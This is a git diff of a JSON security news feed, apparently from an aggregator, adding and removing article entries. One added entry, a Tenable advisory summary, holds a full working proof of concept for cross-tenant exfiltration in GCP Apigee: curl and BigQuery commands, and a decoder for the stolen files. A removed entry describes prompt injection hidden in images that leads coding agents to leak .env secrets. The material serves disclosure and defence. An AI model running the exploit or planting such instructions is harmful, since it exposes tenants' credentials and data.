@@ -1,7 +1,7 @@
 {
-  "generated_at": "2026-08-10T16:23:06.562497+00:00",
+  "generated_at": "2026-08-10T17:04:59.406954+00:00",
   "days_back": 30,
-  "total_items": 7216,
+  "total_items": 7236,
   "items": [
     {
       "title": "GISEC GLOBAL",
@@ -30,6 +30,128 @@
       "curated": false
     },
     {
+      "title": "Thanks for Another Great DEF CON!",
+      "summary": "DEF CON 34 has wrapped up, and it\u2019s been another amazing one. Thanks to the amazing DEF CON Community for bringing the good energy, curiosity and enthuiasm that makes this little desert shindig so special. From the old heads who remember why we have a dialer and a floppy disk in our logo to the brandest new newbies, you are an amazing tribe of humans. Thank you for sharing your passions, making connections and looking out for each other. Special thanks to the army of Goons who make this big machine go. A happening like this takes a lot of skilled and patient hands, and we\u2019re eternally grateful to our top-shelf crew. It\u2019s gonna be another year until DEF CON 35, but take heart. There are DEF CON Groups you can join to keep the vibes going all year. If there\u2019s not one near you, maybe it\u2019s time to think about starting one. Consider sharing your talent with the DEF CON Franklin Project. Stay engaged. The days will fly by. We\u2019re already thinking of ways to top this year, and we can\u2019t wait to see what you lovable scamps get up to in the off season. See you soon,everyone.",
+      "link": "https://defcon.org/html/defcon-34/dc-34-news.html#dc34wrap",
+      "source": "https://defcon.org/defconrss.xml",
+      "type": "osint",
+      "type_label": "OSINT, Communities & Subreddits",
+      "published": "2026-08-10T16:55:57+00:00",
+      "published_ts": 1786380957,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "How Fidelis XDR Supports AI Risk Management Across Network, Endpoint, and Deception Layers",
+      "summary": "See how Fidelis XDR detects and responds to threats targeting AI infrastructure across network, endpoint, and deception layers with full visibility. The post How Fidelis XDR Supports AI Risk Management Across Network, Endpoint, and Deception Layers appeared first on Fidelis Security .",
+      "link": "https://fidelissecurity.com/threatgeek/xdr-security/ai-risk-management-across-network-endpoint-and-cloud/",
+      "source": "Fidelis Security",
+      "type": "vendors",
+      "type_label": "Vendors & Product Blogs",
+      "published": "2026-08-10T16:51:50+00:00",
+      "published_ts": 1786380710,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "I tried Google Wallet's new allowance feature, and my kid's already ditched their debit card",
+      "summary": "The new feature lets you send money to your children without them needing a card or separate account.",
+      "link": "https://www.zdnet.com/article/i-tried-google-wallets-new-allowance-feature/",
+      "source": "ZDNet \u2013 Security",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T16:50:37+00:00",
+      "published_ts": 1786380637,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Gym rat asks AI agent to book him a class, it hacks a waitlist API to bump him up the list",
+      "summary": "What wouldst thou ask of the monkey's paw?",
+      "link": "https://www.theregister.com/ai-and-ml/2026/08/10/gym-rat-asks-ai-agent-to-book-him-a-class-it-hacks-a-waitlist-api-to-bump-him-up-the-list/5285591",
+      "source": "The Register - Security",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T16:45:00+00:00",
+      "published_ts": 1786380300,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "AI-Ready PAM: When Your Identity Security Solution Talks Back",
+      "summary": "How MCP turns PAM into an AI-ready source for faster reporting and compliance visibility",
+      "link": "https://www.security.com/product-insights/ai-ready-pam-when-your-identity-security-solution-talks-back",
+      "source": "Broadcom \u2013 Symantec Blogs",
+      "type": "vendors",
+      "type_label": "Vendors & Product Blogs",
+      "published": "2026-08-10T16:45:00+00:00",
+      "published_ts": 1786380300,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Google Cloud Platform (GCP) Apigee Cross-Tenant Data Exfiltration via Confused Deputy",
+      "summary": "Google Cloud Platform (GCP) Apigee Cross-Tenant Data Exfiltration via Confused Deputy Tenable Research has identified and responsibly disclosed a critical cross-tenant data exfiltration vulnerability in Google Cloud Apigee. This flaw allowed an attacker to abuse a \"confused deputy\" in Apigee's internal analytics infrastructure to read arbitrary Google Cloud Storage (GCS) objects across different tenants, as well as shared production infrastructure buckets. The vulnerability stems from how Apigee's backend analytics services, specifically the first-party service accounts edge-uap@system.gserviceaccount.com and edge-gaambo@system.gserviceaccount.com , query analytics datasets in tenant projects. Using the Apigee runtime service agent token (retrieved via proxy policy access to the Instance Metadata Service), an attacker gains control over BigQuery tables in their tenant project's analytics dataset. The attacker can drop the expected analytics table (api_fact or trace_fact) and replace it with a BigQuery VIEW pointing to an external table over a target Google Cloud Storage URI. When Apigee's backend processes query the api_fact view via the Stats or Debug APIs: Confused Deputy Execution: The backend service account (edge-uap or edge-gaambo) executes the attacker-defined VIEW using its own highly privileged internal credentials. Cross-Tenant GCS Access: Because the backend service account has broad read access to Apigee tenant storage buckets and shared infrastructure repositories, it successfully evaluates the external table's GCS read request. This includes shared Apigee production infrastructure buckets. Data Encoding & Exfiltration: The content of the target GCS files (such as API proxy bundles, credentials, backend URLs, or customer data) is rendered as dimension strings in the Stats API response, leaking the sensitive data back to the attacker. Proof of Concept: Setup: Create a victim Apigee organization and environment, with a deployed API proxy (for best results, the files should be ascii only) Note the Apigee bucket for the deployment, for the POC's purposes (in a real attack the attacker must obtain the name elsewhere): https://apigee.googleapis.com/v1/organizations/ /environments/ /deployedConfig Create an attacker Apigee organization and environment, deploy and trigger a proxy that exfiltrates the Service Agent token (You can follow the steps from issue 512456414 ) Define environment variables export RUNTIME_TOKEN=\" \" export USER_TOKEN=$(gcloud auth print-access-token) export TENANT_PROJECT=$(curl -s \" \" \\ -H \"Authorization: Bearer $USER_TOKEN\" | python3 -c \"import json,sys; print(json.load(sys.stdin)['apigeeProjectId'])\") export ORG=\" \" export ANALYTICS_DATASET=\"analytics_ \" # Replace - with _ export ENV=\" \" export VICTIM_BUCKET=\" \" # For the sake of the POC can be found here: /environments/ /deployedConfig export VICTIM_OBJECT=\" \" # Can be found using step 2. Exploit: Back up the original api_fact table (so analytics can be restored after exfiltration): curl -s -X POST \" \" \\ -H \"Authorization: Bearer $RUNTIME_TOKEN\" \\ -H \"Content-Type: application/json\" \\ -d '{ \"query\": \"CREATE TABLE `'$ANALYTICS_DATASET'.api_fact_backup` AS SELECT * FROM `'$ANALYTICS_DATASET'.api_fact` WHERE client_received_start_timestamp >= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY)\", \"useLegacySql\": false, \"location\": \"US\" }' List the contents of the victim's GCS bucket (to discover which objects are available for exfiltration): # Create external table with wildcard URI to list all objects curl -s -X POST \" \" \\ -H \"Authorization: Bearer $RUNTIME_TOKEN\" \\ -H \"Content-Type: application/json\" \\ -d '{ \"query\": \"CREATE OR REPLACE EXTERNAL TABLE `'$ANALYTICS_DATASET'.exfil_ext` (c1 STRING) OPTIONS (format=\\\"CSV\\\", uris=[\\\"gs://'$VICTIM_BUCKET'/*\\\"], encoding=\\\"ISO-8859-1\\\", field_delimiter=\\\"$\\\", quote=\\\"\\\", allow_jagged_rows=true, preserve_ascii_control_characters=true, max_bad_records=999999)\", \"useLegacySql\": false, \"location\": \"US\" }' # Deploy view that returns filenames as dimension values curl -s -X POST \" \" \\ -H \"Authorization: Bearer $RUNTIME_TOKEN\" \\ -H \"Content-Type: application/json\" \\ -d '{ \"query\": \"CREATE OR REPLACE VIEW `'$ANALYTICS_DATASET'.api_fact` AS SELECT _FILE_NAME AS apiproxy, \\\"'$ORG'\\\" AS organization, \\\"'$ENV'\\\" AS environment, TIMESTAMP(\\\"2026-05-26 12:00:00 UTC\\\") AS client_received_start_timestamp, 1 AS message_count, 1 AS total_response_time FROM `'$ANALYTICS_DATASET'.exfil_ext` GROUP BY _FILE_NAME\", \"useLegacySql\": false, \"location\": \"US\" }' # Trigger via Stats API - response contains full file listing curl -s \" \" \\ -H \"Authorization: Bearer $USER_TOKEN\" The Stats API response will contain dimension names like gs://apigee-xxxx-.../ , listing every object in the victim's bucket. The _FILE_NAME pseudo-column is a BigQuery feature that returns the source GCS URI for each row in an external table. Once a target object is identified from step 2, create a BigQuery external table pointing to that specific file: curl -s -X POST \" \" \\ -H \"Authorization: Bearer $RUNTIME_TOKEN\" \\ -H \"Content-Type: application/json\" \\ -d '{ \"query\": \"CREATE OR REPLACE EXTERNAL TABLE `'$ANALYTICS_DATASET'.exfil_ext` (c1 STRING, c2 STRING, c3 STRING, c4 STRING, c5 STRING, c6 STRING, c7 STRING, c8 STRING, c9 STRING, c10 STRING) OPTIONS (format=\\\"CSV\\\", uris=[\\\"gs://'$VICTIM_BUCKET'/'$VICTIM_OBJECT'\\\"], encoding=\\\"ISO-8859-1\\\", field_delimiter=\\\"$\\\", quote=\\\"\\\", allow_jagged_rows=true, preserve_ascii_control_characters=true)\", \"useLegacySql\": false, \"location\": \"US\" }' Drop the existing api_fact table and replace it with a malicious VIEW that reads the external table and formats the output as Stats API dimensions: # Drop existing api_fact curl -s -X POST \" \" \\ -H \"Authorization: Bearer $RUNTIME_TOKEN\" \\ -H \"Content-Type: application/json\" \\ -d '{ \"query\": \"DROP VIEW IF EXISTS `'$ANALYTICS_DATASET'.api_fact`\", \"useLegacySql\": false, \"location\": \"US\" }' # Create malicious view curl -s -X POST \" \" \\ -H \"Authorization: Bearer $RUNTIME_TOKEN\" \\ -H \"Content-Type: application/json\" \\ -d '{ \"query\": \"CREATE OR REPLACE VIEW `'$ANALYTICS_DATASET'.api_fact` AS SELECT CONCAT(CAST(rn AS STRING), \\\":\\\", ARRAY_TO_STRING(ARRAY(SELECT CAST(cp AS STRING) FROM UNNEST(TO_CODE_POINTS(full_row)) cp), \\\",\\\")) AS apiproxy, \\\"'$ORG'\\\" AS organization, \\\"'$ENV'\\\" AS environment, TIMESTAMP(\\\"2026-05-26 12:00:00 UTC\\\") AS client_received_start_timestamp, 1 AS message_count, 1 AS total_response_time FROM (SELECT ROW_NUMBER() OVER() AS rn, ARRAY_TO_STRING([c1,c2,c3,c4,c5,c6,c7,c8,c9,c10], CHR(36)) AS full_row FROM `'$ANALYTICS_DATASET'.exfil_ext`)\", \"useLegacySql\": false, \"location\": \"US\" }' Trigger edge-uap via the Apigee Stats API. The Stats API causes edge-uap@system.gserviceaccount.com to query api_fact (now our VIEW), which reads the victim's GCS file using edge-uap 's credentials: curl -s \" \" \\ -H \"Authorization: Bearer $USER_TOKEN\" > stats_response.json The Stats API response contains the victim's file content encoded as dimension names: { \"environments\": [{ \"dimensions\": [ {\"name\": \"1:80,75,3,4,20,0,...\", \"metrics\": [{\"name\": \"sum(message_count)\", \"values\": [\"1\"]}]}, {\"name\": \"2:60,63,120,109,...\", \"metrics\": [{\"name\": \"sum(message_count)\", \"values\": [\"1\"]}]}, ... ], \"name\": \"eval\" }] } Each dimension name is a row from the victim's file, encoded as row_number:codepoint,codepoint,... . These code points map directly back to the original file bytes. Reconstruct the victim's file from the code points (as noted this may result in a corrupted zip, but can be repaired using the attached script): import json # Parse stats response response = json.loads(open(\"stats_response.json\").read()) dims = response[\"environments\"][0][\"dimensions\"] rows = {} for d in dims: name = d[\"name\"] rn_str, cps_str = name.split(\":\", 1) rn = int(rn_str) cps = [int(x) for x in cps_str.split(\",\")] rows[rn] = bytes(cp if cp # Reassemble file (rows separated by newline in CSV parsing) max_row = max(rows.keys()) content = b\"\\n\".join(rows.get(i, b\"\") for i in range(1, max_row + 1)) with open(\"exfiltrated_file_corrupted.zip\", \"wb\") as f: f.write(content) To exfiltrate the shared Apigee production files, use the same listing technique from step 2 against the shared bucket ( gs://apigee-uap-deployment-prod ), then point the external table at a discovered file path: curl -s -X POST \" \" \\ -H \"Authorization: Bearer $RUNTIME_TOKEN\" \\ -H \"Content-Type: application/json\" \\ -d '{ \"query\": \"CREATE OR REPLACE EXTERNAL TABLE `'$ANALYTICS_DATASET'.exfil_ext` (c1 STRING, c2 STRING, c3 STRING, c4 STRING, c5 STRING, c6 STRING, c7 STRING, c8 STRING, c9 STRING, c10 STRING) OPTIONS (format=\\\"CSV\\\", uris=[\\\"gs://apigee-uap-deployment-prod/ \\\"], encoding=\\\"ISO-8859-1\\\", field_delimiter=\\\"$\\\", quote=\\\"\\\", allow_jagged_rows=true, preserve_ascii_control_characters=true)\", \"useLegacySql\": false, \"location\": \"US\" }' Then repeat steps 4-7. Restore api_fact after exfiltration (cleanup): curl -s -X POST \" \" \\ -H \"Authorization: Bearer $RUNTIME_TOKEN\" \\ -H \"Content-Type: application/json\" \\ -d '{ \"query\": \"DROP VIEW IF EXISTS `'$ANALYTICS_DATASET'.api_fact`; CREATE TABLE `'$ANALYTICS_DATASET'.api_fact` AS SELECT * FROM `'$ANALYTICS_DATASET'.api_fact_backup`\", \"useLegacySql\": false, \"location\": \"US\" }' Ben Smith Mon, 08/10/2026 - 12:35",
+      "link": "https://www.tenable.com/security/research/tra-2026-53",
+      "source": "Tenable Research Advisories",
+      "type": "vendors",
+      "type_label": "Vendors & Product Blogs",
+      "published": "2026-08-10T16:35:44+00:00",
+      "published_ts": 1786379744,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Exploit / PoC",
+        "Cloud / SaaS",
+        "Network / OT / ICS",
+        "Crypto / Web3"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Web3 Is Building Financial Freedom Only for People Who Can Afford Mistakes",
+      "summary": "When the same mistake recurs across many users, it stops being client error and becomes product data, argues ChangeNOW's Pauline Shangett.",
+      "link": "https://decrypt.co/375226/web3-is-building-financial-freedom-only-for-people-who-can-afford-mistakes",
+      "source": "Decrypt",
+      "type": "crypto",
+      "type_label": "Crypto & Blockchain Security",
+      "published": "2026-08-10T16:25:28+00:00",
+      "published_ts": 1786379128,
+      "smart_groups": [
+        "Crypto / Web3"
+      ],
+      "curated": false
+    },
+    {
+      "title": "Outdated Cybercrime Laws Put Security Researchers at Risk",
+      "summary": "A public policy expert mapped global cybercrime laws to develop a five-point framework for protecting ethical hackers and good-faith security research.",
+      "link": "https://www.darkreading.com/application-security/outdated-cybercrime-laws-security-researchers-risk",
+      "source": "darkreading",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T16:25:22+00:00",
+      "published_ts": 1786379122,
+      "smart_groups": [
+        "Cloud / SaaS"
+      ],
+      "curated": false
+    },
+    {
+      "title": "Scans for Solana (Surfpool&#x3f;) Endpoints, (Mon, Aug 10th)",
+      "summary": "Solana is a crypto platform known for speed. Developers like it to develop distributed applications or to implement crypto payments. To interact with the blockchain, APIs are provided for developers. These APIs will either \"speak\" JSON or gRPC. One implementation often used for development is \"surfpool,\" which is used to test programs before deploying them to a Solana network.",
+      "link": "https://isc.sans.edu/diary/rss/33230",
+      "source": "SANS Internet Storm Center",
+      "type": "government",
+      "type_label": "Government, CERT & Advisories",
+      "published": "2026-08-10T16:24:45+00:00",
+      "published_ts": 1786379085,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
       "title": "orientacion sobre maestria!",
       "summary": "buen dia , actualmente estoy por terminar mi carrera en sistemas como base , estoy analizando que maestria estudiar y tengo en mente \"Ciberseguridad \" o quiza \"Maestr\u00eda en Inteligencia Artificial para el Sector Financiero\" recien comienzo mi carrera laboral tengo medio a\u00f1o en el trabajo actual como tecnico en sistemas , veo un poco de ciberseguridad principalmente redes y lo basico de helpdesk y troubleshooting, diario estudio por aparte de la escuela acabo de terminar certificacion de ccna de cisco basico y estoy cursando el avanzado mas aparte certificacion en H3C , actualmente pienso que para ciberseguridad bastaria aparte de las bases solidas de redes puedo tomar certificaciones y a su vez estudiar una mestria aparte , quiero enfocarme en ciberseguridad realmente me gusta y cada vez que aprendo me gusta mas pero debo tener los pies en la tierra mas porque donde vivo no hay mucha demanda laboral bien pagada. que carrera seria bueno continuar ? no dejare de estudiar redes y ciberseguridad pero creo que es buen momento para tomar segunda opiniones y que me orienten para mi maestria , sera bueno continuar con inteligencia artificial o de lleno a ciberseguridad? submitted by /u/Kwondo_Roku [link] [comments]",
       "link": "https://www.reddit.com/r/cybersecurity/comments/1vkpcay/orientacion_sobre_maestria/",
@@ -41,6 +163,30 @@
       "smart_groups": [
         "Ransomware"
       ],
+      "curated": false
+    },
+    {
+      "title": "Bitcoin price slip wipes weekend gains as oil surge hits 5% on Hormuz disappointment",
+      "summary": "Bitcoin wobbled with US stocks as Iran deflated hopes on the reopening of the Strait of Hormuz oil route, while analysis praised \u201cexceptionally strong\u201d institutional BTC inflows.",
+      "link": "https://cointelegraph.com/markets/bitcoin-wipes-weekend-gains-as-oil-nears-5-surge-on-hormuz-disappointment?utm_source=rss_feed&utm_medium=rss&utm_campaign=rss_partner_inbound",
+      "source": "Cointelegraph.com News",
+      "type": "crypto",
+      "type_label": "Crypto & Blockchain Security",
+      "published": "2026-08-10T16:14:58+00:00",
+      "published_ts": 1786378498,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "XRP Price Weakens as Crypto Market Awaits Clarity",
+      "summary": "XRP is trading just above $1.00, still pinned under a death cross, as the legislative tailwind that lifted it in July loses steam.",
+      "link": "https://decrypt.co/375214/xrp-price-weakens-crypto-market-awaits-clarity",
+      "source": "Decrypt",
+      "type": "crypto",
+      "type_label": "Crypto & Blockchain Security",
+      "published": "2026-08-10T16:11:20+00:00",
+      "published_ts": 1786378280,
+      "smart_groups": [],
       "curated": false
     },
     {
@@ -72,6 +218,18 @@
         "Vulnerabilities / CVEs"
       ],
       "curated": true
+    },
+    {
+      "title": "Cisco security advisory (AV26-794)",
+      "summary": "",
+      "link": "https://cyber.gc.ca/en/alerts-advisories/cisco-security-advisory-av26-794",
+      "source": "Alerts and advisories",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T16:02:17+00:00",
+      "published_ts": 1786377737,
+      "smart_groups": [],
+      "curated": false
     },
     {
       "title": "The Blind Spot: How \u201cBulletproof\u201d Phishing Redirectors Slip Past SEGs",
@@ -188,6 +346,57 @@
       "curated": true
     },
     {
+      "title": "Attack Surface Management - Matt Lea - CSP #227",
+      "summary": "",
+      "link": "https://www.scworld.com/podcast-segment/14660-attack-surface-management-matt-lea-csp-227",
+      "source": "SCM feed for Latest",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T16:00:00+00:00",
+      "published_ts": 1786377600,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Microsoft named a Leader in the 2026 IDC MarketScape for MDR/MXDR for the Enterprise",
+      "summary": "Microsoft is named a Leader in the 2026 IDC MarketScape for MDR services. Discover how Microsoft Defender Experts MDR combines AI, threat intelligence, and human expertise. The post Microsoft named a Leader in the 2026 IDC MarketScape for MDR/MXDR for the Enterprise appeared first on Microsoft Security Blog .",
+      "link": "https://www.microsoft.com/en-us/security/blog/2026/08/10/microsoft-named-a-leader-in-the-2026-idc-marketscape-for-mdr-mxdr-for-the-enterprise/",
+      "source": "Microsoft Security Blog",
+      "type": "vendors",
+      "type_label": "Vendors & Product Blogs",
+      "published": "2026-08-10T16:00:00+00:00",
+      "published_ts": 1786377600,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Sherlock Holmes was the \u201cOG\u201d Social Engineer",
+      "summary": "The crime solver wore disguises, spied on targets, and built intelligence networks long before modern-day tactics emerged. He has lessons for today\u2019s ethical- and nonethical-hat hackers.",
+      "link": "https://www.darkreading.com/cyber-risk/sherlock-holmes-was-the-og-social-engineer",
+      "source": "darkreading",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T15:59:27+00:00",
+      "published_ts": 1786377567,
+      "smart_groups": [
+        "Identity / Access",
+        "Network / OT / ICS"
+      ],
+      "curated": false
+    },
+    {
+      "title": "BlackRock launches two Canada ETFs, with one allocating 3% to Bitcoin",
+      "summary": "BlackRock Canada\u2019s new IBQT fund combines global equity exposure with a 3% Bitcoin allocation through the firm\u2019s Canadian iShares Bitcoin ETF.",
+      "link": "https://cointelegraph.com/news/blackrock-launches-two-canada-etfs-with-one-allocating-3-to-bitcoin?utm_source=rss_feed&utm_medium=rss&utm_campaign=rss_partner_inbound",
+      "source": "Cointelegraph.com News",
+      "type": "crypto",
+      "type_label": "Crypto & Blockchain Security",
+      "published": "2026-08-10T15:59:06+00:00",
+      "published_ts": 1786377546,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
       "title": "Four AI agent governance mistakes to avoid",
       "summary": "Most teams are just starting to reckon with the impact of AI agents on the enterprise \u2013 here\u2019s how to get started.",
       "link": "https://www.scworld.com/perspective/four-ai-agent-governance-mistakes-to-avoid",
@@ -223,6 +432,20 @@
       "smart_groups": [
         "Windows / Microsoft",
         "Linux / Unix"
+      ],
+      "curated": false
+    },
+    {
+      "title": "Hackers Drain $8 Million From Crypto Exchange Across Two Blockchains",
+      "summary": "The attacker moved funds across Tron and Ethereum before routing millions through crypto exchanges, while later wallet activity offers clues about how the breach occurred.",
+      "link": "https://decrypt.co/375213/hackers-drain-8-million-from-crypto-platform-coinsbuy",
+      "source": "Decrypt",
+      "type": "crypto",
+      "type_label": "Crypto & Blockchain Security",
+      "published": "2026-08-10T15:56:30+00:00",
+      "published_ts": 1786377390,
+      "smart_groups": [
+        "Crypto / Web3"
       ],
       "curated": false
     },
@@ -304,6 +527,22 @@
       "curated": false
     },
     {
+      "title": "CISA Warns of Progress LoadMaster Command Injection Vulnerability Exploited in Attacks",
+      "summary": "CISA has added a critical Progress LoadMaster vulnerability to its Known Exploited Vulnerabilities catalog after attackers were observed targeting exposed devices. Tracked as CVE-2026-8037, the flaw affects Progress LoadMaster and Progress ADC products. It is a command injection issue that could let an unauthenticated attacker run arbitrary commands on a vulnerable LoadMaster appliance. The vulnerability [\u2026] The post CISA Warns of Progress LoadMaster Command Injection Vulnerability Exploited in Attacks appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/progress-loadmaster-command-injection-vulnerability-exploited/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T15:12:07+00:00",
+      "published_ts": 1786374727,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Exploit / PoC"
+      ],
+      "curated": true
+    },
+    {
       "title": "OpenAI Says Its Next AI Model Astra May Be Too Dangerous, Pauses Development",
       "summary": "OpenAI says its next major model may be dangerous enough to write its own cyberweapons, and it's pulling back until the safeguards catch up.",
       "link": "https://decrypt.co/375210/openai-pause-astra-ai-model-critical-cyber-capabilities",
@@ -328,6 +567,23 @@
       "curated": false
     },
     {
+      "title": "Windows WalletService Vulnerability Allows Attackers to Escalate Privileges \u2013 PoC Released",
+      "summary": "Microsoft has patched a Windows WalletService vulnerability that could let local attackers gain SYSTEM privileges, with a public proof of concept urging organizations to deploy the July 2026 security updates. Tracked as CVE-2026-49176, the issue is an elevation-of-privilege flaw caused by improper privilege management in WalletService. The official CVE description says an authorized attacker can [\u2026] The post Windows WalletService Vulnerability Allows Attackers to Escalate Privileges \u2013 PoC Released appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/windows-walletservice-vulnerability-poc-released/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T15:01:15+00:00",
+      "published_ts": 1786374075,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Exploit / PoC",
+        "Windows / Microsoft"
+      ],
+      "curated": true
+    },
+    {
       "title": "Elevating Trust: Email Threat Defense Achieves FedRAMP Class D (High) Certification",
       "summary": "Cisco is proud to announce a landmark achievement: Secure Email Threat Defense has officially achieved FedRAMP Class D (High) certification!",
       "link": "https://blogs.cisco.com/security/elevating-trust-email-threat-defense-achieves-fedramp-class-d-high-certification/",
@@ -338,6 +594,22 @@
       "published_ts": 1786374044,
       "smart_groups": [],
       "curated": false
+    },
+    {
+      "title": "\u26a1 Weekly Recap: AI Goes Rogue, Metabase 0-Day, MCP Supply-Chain Attacks, and Router Backdoors",
+      "summary": "A lot of security problems still begin with someone doing a completely normal thing. Cloning a repo. Answering a call. Leaving a box exposed. Trusting the default. That pretty much covers the mood this week. Old bugs are back, supply chains are getting stranger, and some exploit paths are so short you wonder what was supposed to stop them in the first place. That\u2019s only part of it. Here\u2019s",
+      "link": "https://thehackernews.com/2026/08/weekly-recap-ai-goes-rogue-metabase-0.html",
+      "source": "The Hacker News",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T15:00:29+00:00",
+      "published_ts": 1786374029,
+      "smart_groups": [
+        "Curated",
+        "Exploit / PoC",
+        "Malware / Payloads"
+      ],
+      "curated": true
     },
     {
       "title": "DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure",
@@ -353,6 +625,23 @@
         "Ransomware",
         "Network / OT / ICS",
         "Data Breaches / Leaks"
+      ],
+      "curated": true
+    },
+    {
+      "title": "GitHub Expands Supply Chain Malware Detection From npm to 8 Package Registries",
+      "summary": "GitHub has expanded its malware detection capabilities beyond npm, providing developers with broader protection against malicious open-source packages. Dependabot alerts can now identify harmful dependencies across 8 major package ecosystems: npm, PyPI, Maven, RubyGems, NuGet, Go, crates.io, and PHP Composer. A malicious package can steal passwords, API keys, cloud credentials, cryptocurrency wallets, and source code [\u2026] The post GitHub Expands Supply Chain Malware Detection From npm to 8 Package Registries appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/github-expands-supply-chain-malware-detection/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T14:57:47+00:00",
+      "published_ts": 1786373867,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Malware / Payloads",
+        "Crypto / Web3"
       ],
       "curated": true
     },
@@ -382,6 +671,38 @@
       "published_ts": 1786373449,
       "smart_groups": [
         "Ransomware"
+      ],
+      "curated": false
+    },
+    {
+      "title": "Red Hat ACM Privilege Escalation Vulnerability Lets Attackers Gain Full Cluster-Admin Access",
+      "summary": "Red Hat has disclosed a critical privilege escalation flaw, tracked as CVE-2026-10090, affecting the Application Subscription controller in Red Hat Advanced Cluster Management for Kubernetes (ACM). Rated Important with a CVSS score of 9.9, the vulnerability allows a user with only namespace-scoped \u201cedit\u201d permissions on an ACM hub to escalate all the way to full [\u2026] The post Red Hat ACM Privilege Escalation Vulnerability Lets Attackers Gain Full Cluster-Admin Access appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/red-hat-acm-privilege-escalation-vulnerability/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T14:46:22+00:00",
+      "published_ts": 1786373182,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Linux / Unix",
+        "Cloud / SaaS"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Cyberattack on Steam hardware shipper leaks names, addresses, and order data",
+      "summary": "Video game publisher Valve is alerting customers in Europe to a data breach at CEVA Logistics, its Steam hardware shipping partner. Reports from affected customers began surfacing on social media earlier today, after Valve started sending out data breach notification emails. \u201cBetween July 29 2026 and August 1, 2026, a cyberattack hit CEVA Logistics, the company that ships Steam hardware to customers in Europe. CEVA is still investigating this attack, but as Valve learned on \u2026 More \u2192 The post Cyberattack on Steam hardware shipper leaks names, addresses, and order data appeared first on Help Net Security .",
+      "link": "https://www.helpnetsecurity.com/2026/08/10/valve-data-breach-ceva-logistics-steam-hardware/",
+      "source": "Help Net Security",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-08-10T14:34:36+00:00",
+      "published_ts": 1786372476,
+      "smart_groups": [
+        "Network / OT / ICS",
+        "Data Breaches / Leaks"
       ],
       "curated": false
     },
@@ -100469,45 +100790,6 @@
       "smart_groups": [
         "Windows / Microsoft"
       ],
-      "curated": false
-    },
-    {
-      "title": "New Ghostcommit Attack Hides Malicious Prompts in Images to Exploit AI Agents",
-      "summary": "A novel supply chain attack called \u201cGhostcommit\u201d that conceals prompt-injection instructions within PNG images to bypass AI code reviewers and trick coding agents into leaking secrets such as .env files. The ASSET Research Group demonstrated that a pull request containing an explicit, plain-text instruction to exfiltrate a repository\u2019s .env file is caught immediately by LLM-based [\u2026] The post New Ghostcommit Attack Hides Malicious Prompts in Images to Exploit AI Agents appeared first on Cyber Security News .",
-      "link": "https://cybersecuritynews.com/ghostcommit-attack-hides-prompts/",
-      "source": "Cyber Security News (FeedBurner)",
-      "type": "general",
-      "type_label": "General Security & Blogs",
-      "published": "2026-07-11T16:22:35+00:00",
-      "published_ts": 1783786955,
-      "smart_groups": [
-        "Curated",
-        "Exploit / PoC"
-      ],
-      "curated": true
-    },
-    {
-      "title": "What Is Robinhood Chain? The Ethereum Layer-2 Network for Tokenized Stocks",
-      "summary": "Robinhood Chain is an Ethereum layer-2 network built with Arbitrum technology for tokenized assets, crypto apps, and on-chain financial products.",
-      "link": "https://decrypt.co/resources/what-robinhood-chain-ethereum-layer-2-network-tokenized-stocks",
-      "source": "Decrypt",
-      "type": "crypto",
-      "type_label": "Crypto & Blockchain Security",
-      "published": "2026-07-11T16:21:34+00:00",
-      "published_ts": 1783786894,
-      "smart_groups": [],
-      "curated": false
-    },
-    {
-      "title": "Scanning malicious websites with arbitrary number of VPN tunnels (Part 2)",
-      "summary": "submitted by /u/moonlightelite [link] [comments]",
-      "link": "https://www.reddit.com/r/netsec/comments/1uto85z/scanning_malicious_websites_with_arbitrary_number/",
-      "source": "/r/netsec",
-      "type": "osint",
-      "type_label": "OSINT, Communities & Subreddits",
-      "published": "2026-07-11T16:13:28+00:00",
-      "published_ts": 1783786408,
-      "smart_groups": [],
       "curated": false
     },
     {
